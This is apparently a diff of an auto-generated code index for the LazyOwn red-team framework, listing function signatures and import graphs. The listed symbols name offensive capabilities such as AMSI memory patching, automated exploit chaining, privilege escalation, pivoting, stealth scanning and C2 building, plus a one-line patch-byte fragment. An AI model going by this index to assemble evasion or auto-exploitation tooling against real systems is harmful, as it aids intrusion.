@@ -75,41 +75,41 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `configure_logging` (function, line 56) `def configure_logging(debug)`
-  - `AgentTool` (class, line 61) `class AgentTool`
-  - `CommandMetadata` (class, line 127) `class CommandMetadata`
-  - `ASTToolExtractor` (class, line 133) `class ASTToolExtractor`
-  - `AgentRunner` (class, line 175) `class AgentRunner`
-  - `LazyOwnShellWrapper` (class, line 355) `class LazyOwnShellWrapper`
-  - `VulnBotCLI` (class, line 438) `class VulnBotCLI`
-  - `interactive_mode` (method, line 503) `def interactive_mode(bot)`
-  - `parse_args` (method, line 526) `def parse_args()`
-  - `main` (method, line 535) `def main()`
-  - `__init__` (method, line 64) `def __init__(self, name, description, func, parameters, required)`
-  - `to_api_format` (method, line 75) `def to_api_format(self)`
-  - `execute` (method, line 85) `def execute(self)`
-  - `extract_commands_from_file` (method, line 137) `def extract_commands_from_file(file_path, prefix)`
-  - `__init__` (method, line 178) `def __init__(self, model, system_prompt, max_iterations)`
-  - `_reset_history` (method, line 192) `def _reset_history(self)`
-  - `_manage_memory` (method, line 198) `def _manage_memory(self)`
-  - `register_tool` (method, line 206) `def register_tool(self, tool)`
-  - `register_tool_from_instance` (method, line 209) `def register_tool_from_instance(self, func)`
-  - `register_tools_from_metadata` (method, line 227) `def register_tools_from_metadata(self, commands, executor)`
-  - `get_tools_for_api` (method, line 252) `def get_tools_for_api(self)`
-  - `run` (method, line 257) `def run(self, user_input)`
-  - `_call_model` (method, line 281) `def _call_model(self)`
-  - `_process_tool_call` (method, line 304) `def _process_tool_call(self, tool_call)`
-  - `__init__` (method, line 358) `def __init__(self, script_path)`
-  - `_load_shell` (method, line 365) `def _load_shell(self)`
-  - `execute_command` (method, line 388) `def execute_command(self, command)`
-  - `get_commands_summary` (method, line 431) `def get_commands_summary(self)`
-  - `__init__` (method, line 440) `def __init__(self, provider, mode, debug, script_path)`
-  - `_load_model` (method, line 452) `def _load_model(self)`
-  - `_setup_agent` (method, line 467) `def _setup_agent(self)`
-  - `process_request` (method, line 498) `def process_request(self, user_input)`
-  - `target` (method, line 395) `def target()`
-  - `make_executor` (method, line 230) `def make_executor(cmd_name)`
-  - `wrapper` (method, line 231) `def wrapper(command)`
+  - `configure_logging` (function, line 58) `def configure_logging(debug)`
+  - `AgentTool` (class, line 63) `class AgentTool`
+  - `CommandMetadata` (class, line 129) `class CommandMetadata`
+  - `ASTToolExtractor` (class, line 135) `class ASTToolExtractor`
+  - `AgentRunner` (class, line 177) `class AgentRunner`
+  - `LazyOwnShellWrapper` (class, line 357) `class LazyOwnShellWrapper`
+  - `VulnBotCLI` (class, line 434) `class VulnBotCLI`
+  - `interactive_mode` (method, line 499) `def interactive_mode(bot)`
+  - `parse_args` (method, line 522) `def parse_args()`
+  - `main` (method, line 531) `def main()`
+  - `__init__` (method, line 66) `def __init__(self, name, description, func, parameters, required)`
+  - `to_api_format` (method, line 77) `def to_api_format(self)`
+  - `execute` (method, line 87) `def execute(self)`
+  - `extract_commands_from_file` (method, line 139) `def extract_commands_from_file(file_path, prefix)`
+  - `__init__` (method, line 180) `def __init__(self, model, system_prompt, max_iterations)`
+  - `_reset_history` (method, line 194) `def _reset_history(self)`
+  - `_manage_memory` (method, line 200) `def _manage_memory(self)`
+  - `register_tool` (method, line 208) `def register_tool(self, tool)`
+  - `register_tool_from_instance` (method, line 211) `def register_tool_from_instance(self, func)`
+  - `register_tools_from_metadata` (method, line 229) `def register_tools_from_metadata(self, commands, executor)`
+  - `get_tools_for_api` (method, line 254) `def get_tools_for_api(self)`
+  - `run` (method, line 259) `def run(self, user_input)`
+  - `_call_model` (method, line 283) `def _call_model(self)`
+  - `_process_tool_call` (method, line 306) `def _process_tool_call(self, tool_call)`
+  - `__init__` (method, line 360) `def __init__(self, script_path)`
+  - `_load_shell` (method, line 367) `def _load_shell(self)`
+  - `execute_command` (method, line 390) `def execute_command(self, command)`
+  - `get_commands_summary` (method, line 427) `def get_commands_summary(self)`
+  - `__init__` (method, line 436) `def __init__(self, provider, mode, debug, script_path)`
+  - `_load_model` (method, line 448) `def _load_model(self)`
+  - `_setup_agent` (method, line 463) `def _setup_agent(self)`
+  - `process_request` (method, line 494) `def process_request(self, user_input)`
+  - `target` (method, line 397) `def target()`
+  - `make_executor` (method, line 232) `def make_executor(cmd_name)`
+  - `wrapper` (method, line 233) `def wrapper(command)`
 - Depends on: `core/logging.py`, `modules/ai_model.py`, `modules/llm_factory.py`, `modules/logging_config.py`
 - Imported by: `modules/vuln_agent.py`, `modules/vulnbot.py`
 
@@ -146,14 +146,14 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `AIResult` (class, line 87) `class AIResult`
-  - `_ollama_available` (method, line 96) `def _ollama_available()`
-  - `_best_ollama_model` (method, line 104) `def _best_ollama_model()`
-  - `_ollama_call` (method, line 131) `def _ollama_call(model, system, user, max_tokens, temperature)`
-  - `_is_quota_error` (method, line 174) `def _is_quota_error(exc)`
-  - `_groq_call` (method, line 179) `def _groq_call(api_key, system, user, max_tokens, temperature)`
-  - `_toposwarm_call` (method, line 204) `def _toposwarm_call(prompt, system)`
-  - `call` (method, line 230) `def call(prompt, system, api_key, max_tokens, temperature)`
+  - `AIResult` (class, line 89) `class AIResult`
+  - `_ollama_available` (method, line 99) `def _ollama_available()`
+  - `_best_ollama_model` (method, line 107) `def _best_ollama_model()`
+  - `_ollama_call` (method, line 134) `def _ollama_call(model, system, user, max_tokens, temperature)`
+  - `_is_quota_error` (method, line 178) `def _is_quota_error(exc)`
+  - `_groq_call` (method, line 183) `def _groq_call(api_key, system, user, max_tokens, temperature)`
+  - `_toposwarm_call` (method, line 210) `def _toposwarm_call(prompt, system)`
+  - `call` (method, line 238) `def call(prompt, system, api_key, max_tokens, temperature)`
 - Depends on: `modules/llm_factory.py`, `modules/toposwarm_bridge.py`
 - Imported by: `modules/recommender.py`, `modules/timeline_narrator.py`
 
@@ -210,7 +210,12 @@
   - `AMS1patch_E_HANDLE` (function, line 326) `void AMS1patch_E_HANDLE(HANDLE hproc)`
   - `AMS1patch_E_OUTOFMEMORY` (function, line 378) `void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)`
   - `main` (function, line 427) `int main(int argc, char** argv)`
-  - `NT_SUCCESS` (macro, line 11)
+  - `NTSTATUS` (function, line 19) `typedef NTSTATUS(WINAPI *NtProtectVirtualMemoryType)( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);`
+  - `printf` (function, line 44) `printf("Failed to get procedure address\n");`
+  - `exit` (function, line 45) `exit(1);`
+  - `ZeroMemory` (function, line 72) `ZeroMemory(Patch, 100);`
+  - `lstrcatA` (function, line 75) `lstrcatA(Patch, "\x75");`
+  - `NT_SUCCESS` (macro, line 11) `#define NT_SUCCESS(Status)`
 
 ## modules/amt_auth_bypass.py
 - Layer: utility
@@ -256,7 +261,7 @@
   - `load_enriched` (function, line 159) `def load_enriched()`
   - `query_atomic` (function, line 175) `def query_atomic(keyword, mitre_id, platform, scope, has_prereqs, complexity, limit, include_command)`
 - Depends on: `core/logging.py`
-- Imported by: `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_parquet_db.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `skills/lazyown_groq_agents.py`, `skills/lazyown_groq_agents.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_parquet_db.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/auto_pivot.py
 - Layer: utility
@@ -356,36 +361,36 @@
   - `_match_by_port` (method, line 958) `def _match_by_port(self, port, os_type)`
   - `_scorer` (method, line 1017) `def _scorer(self, exploit, service, product, version)`
   - `_run_exploit` (method, line 1057) `def _run_exploit(self, candidate, profile)`
-  - `_resolve_port` (method, line 1091) `def _resolve_port(self, candidate, profile)`
-  - `_build_command_chain` (method, line 1110) `def _build_command_chain(self, candidate, profile)`
-  - `_check_success` (method, line 1246) `def _check_success(self, output, candidate)`
-  - `_detect_shell` (method, line 1307) `def _detect_shell(self, output)`
-  - `_determine_access_level` (method, line 1335) `def _determine_access_level(self, ip, credentials)`
-  - `_register_session` (method, line 1367) `def _register_session(self, ip, output)`
-  - `_load_payload_config` (method, line 1395) `def _load_payload_config(self)`
-  - `_load_world_model` (method, line 1406) `def _load_world_model(self, target)`
-  - `_detect_os_from_payload` (method, line 1497) `def _detect_os_from_payload(self)`
-  - `_load_from_nmap_xml` (method, line 1515) `def _load_from_nmap_xml(self, target)`
-  - `_get_os_type` (method, line 1590) `def _get_os_type(self, profile)`
-  - `_apply_stealth_delay` (method, line 1606) `def _apply_stealth_delay(self)`
-  - `scan_vulnerabilities` (method, line 1617) `def scan_vulnerabilities(self, profile)`
-  - `_parse_nse_output` (method, line 1643) `def _parse_nse_output(self, target_ip)`
-  - `_extract_cves_from_text` (method, line 1678) `def _extract_cves_from_text(self, text)`
-  - `_match_service_banners` (method, line 1726) `def _match_service_banners(self, profile)`
-  - `_check_known_cves` (method, line 1900) `def _check_known_cves(self, profile)`
-  - `chain_privesc` (method, line 1924) `def chain_privesc(self, profile, session_id)`
-  - `_run_linux_privesc_checks` (method, line 1954) `def _run_linux_privesc_checks(self, profile, session_id)`
-  - `_run_windows_privesc_checks` (method, line 2028) `def _run_windows_privesc_checks(self, profile, session_id)`
-  - `_match_privesc_techniques` (method, line 2076) `def _match_privesc_techniques(self, findings, os_type)`
-  - `_execute_privesc` (method, line 2227) `def _execute_privesc(self, technique, profile, session_id)`
-  - `trigger_pivot` (method, line 2330) `def trigger_pivot(self, profile, session_id)`
-  - `_discover_internal_interfaces` (method, line 2399) `def _discover_internal_interfaces(self, profile)`
-  - `enable_stealth` (method, line 2465) `def enable_stealth(self, stealth_level)`
-  - `_get_stealth_scan_flags` (method, line 2510) `def _get_stealth_scan_flags(self)`
-  - `full_auto_pwn` (method, line 2529) `def full_auto_pwn(cls, target, enable_pivot, enable_privesc, stealth)`
+  - `_resolve_port` (method, line 1085) `def _resolve_port(self, candidate, profile)`
+  - `_build_command_chain` (method, line 1104) `def _build_command_chain(self, candidate, profile)`
+  - `_check_success` (method, line 1240) `def _check_success(self, output, candidate)`
+  - `_detect_shell` (method, line 1301) `def _detect_shell(self, output)`
+  - `_determine_access_level` (method, line 1329) `def _determine_access_level(self, ip, credentials)`
+  - `_register_session` (method, line 1361) `def _register_session(self, ip, output)`
+  - `_load_payload_config` (method, line 1389) `def _load_payload_config(self)`
+  - `_load_world_model` (method, line 1400) `def _load_world_model(self, target)`
+  - `_detect_os_from_payload` (method, line 1491) `def _detect_os_from_payload(self)`
+  - `_load_from_nmap_xml` (method, line 1509) `def _load_from_nmap_xml(self, target)`
+  - `_get_os_type` (method, line 1584) `def _get_os_type(self, profile)`
+  - `_apply_stealth_delay` (method, line 1600) `def _apply_stealth_delay(self)`
+  - `scan_vulnerabilities` (method, line 1611) `def scan_vulnerabilities(self, profile)`
+  - `_parse_nse_output` (method, line 1637) `def _parse_nse_output(self, target_ip)`
+  - `_extract_cves_from_text` (method, line 1672) `def _extract_cves_from_text(self, text)`
+  - `_match_service_banners` (method, line 1720) `def _match_service_banners(self, profile)`
+  - `_check_known_cves` (method, line 1894) `def _check_known_cves(self, profile)`
+  - `chain_privesc` (method, line 1918) `def chain_privesc(self, profile, session_id)`
+  - `_run_linux_privesc_checks` (method, line 1948) `def _run_linux_privesc_checks(self, profile, session_id)`
+  - `_run_windows_privesc_checks` (method, line 2016) `def _run_windows_privesc_checks(self, profile, session_id)`
+  - `_match_privesc_techniques` (method, line 2058) `def _match_privesc_techniques(self, findings, os_type)`
+  - `_execute_privesc` (method, line 2209) `def _execute_privesc(self, technique, profile, session_id)`
+  - `trigger_pivot` (method, line 2306) `def trigger_pivot(self, profile, session_id)`
+  - `_discover_internal_interfaces` (method, line 2375) `def _discover_internal_interfaces(self, profile)`
+  - `enable_stealth` (method, line 2435) `def enable_stealth(self, stealth_level)`
+  - `_get_stealth_scan_flags` (method, line 2480) `def _get_stealth_scan_flags(self)`
+  - `full_auto_pwn` (method, line 2499) `def full_auto_pwn(cls, target, enable_pivot, enable_privesc, stealth)`
   - `_is_placeholder` (method, line 290) `def _is_placeholder(value)`
-- Depends on: `modules/auto_pivot.py`, `modules/db.py`
-- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `modules/ai_exploit_chain.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `mutants/tests/test_phase1_data_gaps.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`
+- Depends on: `core/safe_exec.py`, `modules/auto_pivot.py`, `modules/db.py`
+- Imported by: `cli/commands/misc_migrated.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `cli/commands/pwn.py`, `modules/ai_exploit_chain.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`, `tests/test_phase1_data_gaps.py`
 
 ## modules/aws_attacks.py
 - Layer: utility
@@ -423,7 +428,7 @@
   - `from_payload` (method, line 402) `def from_payload(cls, payload)`
   - `from_payload_file` (method, line 407) `def from_payload_file(cls, path)`
 - Depends on: `core/config.py`, `core/logging.py`, `modules/c2_profile_engine.py`, `modules/sleep_obfuscation.py`, `modules/socks_proxy.py`
-- Imported by: `cli/commands/bof_registry.py`, `mutants/tests/test_beacon_config_builder.py`, `tests/test_beacon_config_builder.py`
+- Imported by: `cli/commands/bof_registry.py`, `tests/test_beacon_config_builder.py`
 
 ## modules/beacon_history.py
 - Layer: utility
@@ -437,7 +442,7 @@
   - `sessions_dir` (method, line 39) `def sessions_dir(self)`
   - `records_path` (method, line 43) `def records_path(self, client_id)`
 - Depends on: `core/logging.py`
-- Imported by: `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `mutants/tests/test_beacon_history.py`, `mutants/tests/test_security_lazyc2.py`, `tests/test_beacon_history.py`, `tests/test_security_lazyc2.py`
+- Imported by: `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `lazyc2.py`, `tests/test_beacon_history.py`, `tests/test_security_lazyc2.py`
 
 ## modules/bin2img.py
 - Layer: utility
@@ -518,31 +523,35 @@
   - `list_missing_dependencies` (method, line 765) `def list_missing_dependencies(self, name)`
   - `bulk_install` (method, line 776) `def bulk_install(self, names)`
 - Depends on: `cli/commands/enum.py`, `core/logging.py`
-- Imported by: `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `mutants/tests/test_bof_registry.py`, `tests/test_bof_registry.py`
+- Imported by: `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `cli/commands/bof_registry.py`, `tests/test_bof_registry.py`
 
 ## modules/bot.py
 - Layer: utility
 - Language: py
 - Symbols:
-  - `buscar_repos_nuevos` (function, line 17) `def buscar_repos_nuevos(lenguaje, dias, cantidad, orden)`
+  - `BotConfig` (class, line 20) `class BotConfig`
+  - `find_new_repos` (method, line 48) `def find_new_repos(language, days, count, order, config)`
+  - `render_repos` (method, line 102) `def render_repos(repos, config)`
+  - `format_output` (method, line 128) `def format_output(content, config)`
+  - `main` (method, line 148) `def main(config)`
 
 ## modules/c2_builder.py
 - Layer: presentation
 - Language: py
 - Symbols:
-  - `_resolve_go_bin` (function, line 44) `def _resolve_go_bin()`
-  - `_ensure_go` (function, line 59) `def _ensure_go(cmd_fn)`
-  - `C2Profile` (class, line 76) `class C2Profile`
-  - `_preflight` (method, line 160) `def _preflight(profile)`
-  - `_render_template` (method, line 171) `def _render_template(content, context)`
-  - `_build_context` (method, line 181) `def _build_context(sessions_dir)`
-  - `C2Builder` (class, line 212) `class C2Builder`
-  - `_replacer` (method, line 174) `def _replacer(match)`
-  - `__init__` (method, line 215) `def __init__(self, params, sessions_dir, cmd_fn, onecmd_fn, toastr_fn, c2_user, c2_pass)`
-  - `run` (method, line 233) `def run(self, line, choice, use_tunnel)`
-  - `_read` (method, line 425) `def _read(path_)`
-  - `_read_required` (method, line 432) `def _read_required(path_)`
-  - `_write` (method, line 436) `def _write(path_, content)`
+  - `_resolve_go_bin` (function, line 43) `def _resolve_go_bin()`
+  - `_ensure_go` (function, line 58) `def _ensure_go(cmd_fn)`
+  - `C2Profile` (class, line 75) `class C2Profile`
+  - `_preflight` (method, line 159) `def _preflight(profile)`
+  - `_render_template` (method, line 168) `def _render_template(content, context)`
+  - `_build_context` (method, line 180) `def _build_context(sessions_dir)`
+  - `C2Builder` (class, line 211) `class C2Builder`
+  - `_replacer` (method, line 172) `def _replacer(match)`
+  - `__init__` (method, line 214) `def __init__(self, params, sessions_dir, cmd_fn, onecmd_fn, toastr_fn, c2_user, c2_pass)`
+  - `run` (method, line 232) `def run(self, line, choice, use_tunnel)`
+  - `_read` (method, line 418) `def _read(path_)`
+  - `_read_required` (method, line 425) `def _read_required(path_)`
+  - `_write` (method, line 429) `def _write(path_, content)`
 - Depends on: `core/validators.py`, `modules/metrics.py`, `utils.py`
 - Imported by: `cli/commands/command_and_control_migrated.py`
 
@@ -654,7 +663,7 @@
   - `from_payload` (method, line 757) `def from_payload(cls, payload)`
   - `from_config` (method, line 762) `def from_config(cls, config)`
 - Depends on: `cli/commands/enum.py`, `core/config.py`, `core/logging.py`
-- Imported by: `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `modules/beacon_config_builder.py`, `mutants/tests/test_c2_profile_engine.py`, `tests/test_c2_profile_engine.py`
+- Imported by: `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `cli/commands/c2_profile.py`, `modules/beacon_config_builder.py`, `tests/test_c2_profile_engine.py`
 
 ## modules/cal.sh
 - Layer: utility
@@ -668,7 +677,7 @@
 ## modules/categories.py
 - Layer: utility
 - Language: py
-- Imported by: `cli/commands/automation.py`, `cli/commands/cred.py`, `cli/commands/exploit.py`, `cli/commands/lateral.py`, `cli/commands/persist.py`, `cli/commands/postexp.py`, `mutants/tests/test_categories.py`, `tests/test_categories.py`
+- Imported by: `cli/commands/automation.py`, `cli/commands/cred.py`, `cli/commands/exploit.py`, `cli/commands/lateral.py`, `cli/commands/persist.py`, `cli/commands/postexp.py`, `tests/test_categories.py`
 
 ## modules/cicd_enumerator.py
 - Layer: utility
@@ -711,7 +720,7 @@
   - `_clear_cli_session` (function, line 471) `def _clear_cli_session()`
   - `needs_login` (function, line 480) `def needs_login()`
 - Depends on: `cli/engagement_hooks.py`, `modules/lazy_rbac.py`
-- Imported by: `cli/auto_crypto.py`, `cli/banner_config.py`, `cli/banner_config.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/engagement_hooks.py`, `cli/tips_engine.py`, `cli/wizard.py`, `cli/wizard.py`, `cli/wizard.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `modules/redteam_gym.py`, `mutants/tests/test_engagement_elo_and_methodology.py`, `tests/test_engagement_elo_and_methodology.py`
+- Imported by: `cli/auto_crypto.py`, `cli/banner_config.py`, `cli/banner_config.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/commands/cli_auth.py`, `cli/engagement_hooks.py`, `cli/tips_engine.py`, `cli/wizard.py`, `cli/wizard.py`, `cli/wizard.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `lazyown.py`, `modules/redteam_gym.py`, `tests/test_engagement_elo_and_methodology.py`
 
 ## modules/cloud_enum.py
 - Layer: utility
@@ -732,8 +741,8 @@
   - `_enumerate_aws_iam` (method, line 354) `def _enumerate_aws_iam(self)`
   - `_enumerate_azure_iam` (method, line 388) `def _enumerate_azure_iam(self)`
   - `_enumerate_gcp_iam` (method, line 424) `def _enumerate_gcp_iam(self)`
-  - `_check_aws_privesc` (method, line 462) `def _check_aws_privesc(data)`
-  - `full_enumeration` (method, line 502) `def full_enumeration(self)`
+  - `_check_aws_privesc` (method, line 475) `def _check_aws_privesc(data)`
+  - `full_enumeration` (method, line 515) `def full_enumeration(self)`
 - Imported by: `cli/commands/cloud.py`
 
 ## modules/collab_bp.py
@@ -790,7 +799,7 @@
   - `decorated` (method, line 133) `def decorated()`
   - `decorated` (method, line 80) `def decorated()`
 - Depends on: `core/logging.py`, `modules/lazy_rbac.py`
-- Imported by: `cli/commands/collaboration.py`, `cli/commands/collaboration.py`, `cli/commands/collaboration.py`, `lazyc2.py`, `modules/engagement_hooks.py`, `modules/event_bus.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_collab_and_onboarding.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_core_modules.py`
+- Imported by: `cli/commands/collaboration.py`, `cli/commands/collaboration.py`, `cli/commands/collaboration.py`, `lazyc2.py`, `modules/engagement_hooks.py`, `modules/event_bus.py`, `skills/lazyown_mcp.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_collab_and_onboarding.py`, `tests/test_core_modules.py`
 
 ## modules/colors.py
 - Layer: utility
@@ -805,19 +814,19 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `ExecutionResult` (class, line 37) `class ExecutionResult`
-  - `CommandExecutor` (class, line 46) `class CommandExecutor`
-  - `get_executor` (method, line 257) `def get_executor()`
-  - `__init__` (method, line 58) `def __init__(self)`
-  - `instance` (method, line 62) `def instance(cls)`
-  - `add_hook` (method, line 67) `def add_hook(self, hook)`
-  - `run` (method, line 71) `def run(self, command, timeout, stream)`
-  - `_needs_shell` (method, line 105) `def _needs_shell(self, command)`
-  - `_run_capture` (method, line 109) `def _run_capture(self, command, timeout)`
-  - `_run_stream` (method, line 133) `def _run_stream(self, command, timeout)`
-  - `run_with_tee` (method, line 169) `def run_with_tee(self, command, output_path, timeout)`
-  - `_fire_hooks` (method, line 228) `def _fire_hooks(self, result)`
-  - `_publish_event` (method, line 235) `def _publish_event(self, result)`
+  - `ExecutionResult` (class, line 38) `class ExecutionResult`
+  - `CommandExecutor` (class, line 47) `class CommandExecutor`
+  - `get_executor` (method, line 264) `def get_executor()`
+  - `__init__` (method, line 59) `def __init__(self)`
+  - `instance` (method, line 63) `def instance(cls)`
+  - `add_hook` (method, line 68) `def add_hook(self, hook)`
+  - `run` (method, line 72) `def run(self, command, timeout, stream)`
+  - `_needs_shell` (method, line 106) `def _needs_shell(self, command)`
+  - `_run_capture` (method, line 110) `def _run_capture(self, command, timeout)`
+  - `_run_stream` (method, line 135) `def _run_stream(self, command, timeout)`
+  - `run_with_tee` (method, line 172) `def run_with_tee(self, command, output_path, timeout)`
+  - `_fire_hooks` (method, line 232) `def _fire_hooks(self, result)`
+  - `_publish_event` (method, line 239) `def _publish_event(self, result)`
 - Depends on: `core/logging.py`, `modules/event_bus.py`
 
 ## modules/compliance.py
@@ -879,8 +888,8 @@
   - `fire` (method, line 514) `def fire(self, event, context)`
   - `list_rules` (method, line 565) `def list_rules(self)`
   - `get_rule` (method, line 569) `def get_rule(self, name)`
-- Depends on: `core/logging.py`, `modules/credential_reuse.py`, `modules/state_manager.py`
-- Imported by: `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `lazyc2.py`, `lazyc2/blueprints/beacon.py`, `mutants/tests/test_conditional_hooks_extended.py`, `mutants/tests/test_conditional_hooks_extended.py`, `mutants/tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`
+- Depends on: `core/logging.py`, `core/safe_exec.py`, `modules/credential_reuse.py`, `modules/state_manager.py`
+- Imported by: `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `cli/commands/automation.py`, `lazyc2.py`, `lazyc2/blueprints/beacon.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`, `tests/test_conditional_hooks_extended.py`
 
 ## modules/config_store.py
 - Layer: data_access
@@ -898,7 +907,7 @@
   - `_start_watcher` (function, line 169) `def _start_watcher(interval)`
   - `_watch_loop` (function, line 174) `def _watch_loop()`
 - Depends on: `core/logging.py`
-- Imported by: `mutants/tests/test_core_modules.py`, `tests/test_core_modules.py`
+- Imported by: `tests/test_core_modules.py`
 
 ## modules/credential_reuse.py
 - Layer: utility
@@ -956,7 +965,7 @@
   - `_rate_limit` (method, line 120) `def _rate_limit(self)`
   - `_query` (method, line 127) `def _query(self)`
 - Depends on: `core/logging.py`
-- Imported by: `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`
+- Imported by: `skills/lazyown_mcp.py`, `tests/test_core_modules.py`
 
 ## modules/dacl_abuse.py
 - Layer: infrastructure
@@ -996,7 +1005,7 @@
   - `_normalize_ts` (function, line 901) `def _normalize_ts(raw)`
   - `_read_timeline` (function, line 922) `def _read_timeline()`
   - `dashboard_timeline` (function, line 1001) `def dashboard_timeline()`
-- Imported by: `lazyc2.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_dashboard_routes.py`, `mutants/tests/test_dashboard_routes.py`, `mutants/tests/test_dashboard_routes.py`, `mutants/tests/test_dashboard_routes.py`, `tests/test_core_modules.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`
+- Imported by: `lazyc2.py`, `tests/test_core_modules.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`, `tests/test_dashboard_routes.py`
 
 ## modules/dashboard_engine.py
 - Layer: utility
@@ -1025,7 +1034,7 @@
 - Language: py
 - Symbols:
   - `LazyOwnDB` (class, line 147) `class LazyOwnDB`
-  - `get_db` (method, line 766) `def get_db(db_path)`
+  - `get_db` (method, line 779) `def get_db(db_path)`
   - `__init__` (method, line 159) `def __init__(self, db_path)`
   - `_get_conn` (method, line 171) `def _get_conn(self)`
   - `db_path` (method, line 182) `def db_path(self)`
@@ -1039,27 +1048,28 @@
   - `workspace_create` (method, line 293) `def workspace_create(self, name, description)`
   - `workspace_list` (method, line 308) `def workspace_list(self)`
   - `workspace_get` (method, line 314) `def workspace_get(self, name)`
-  - `workspace_delete` (method, line 321) `def workspace_delete(self, name)`
-  - `host_add` (method, line 350) `def host_add(self, workspace_id, address, mac, hostname, os, state)`
-  - `host_delete` (method, line 383) `def host_delete(self, host_id)`
-  - `host_list` (method, line 394) `def host_list(self, workspace_id)`
-  - `host_find` (method, line 403) `def host_find(self, workspace_id, query)`
-  - `service_add` (method, line 420) `def service_add(self, host_id, port, protocol, state, name, product, version)`
-  - `service_list` (method, line 440) `def service_list(self, host_id)`
-  - `vuln_add` (method, line 453) `def vuln_add(self, host_id, name, severity, description, refs)`
-  - `vuln_list` (method, line 471) `def vuln_list(self, workspace_id, severity)`
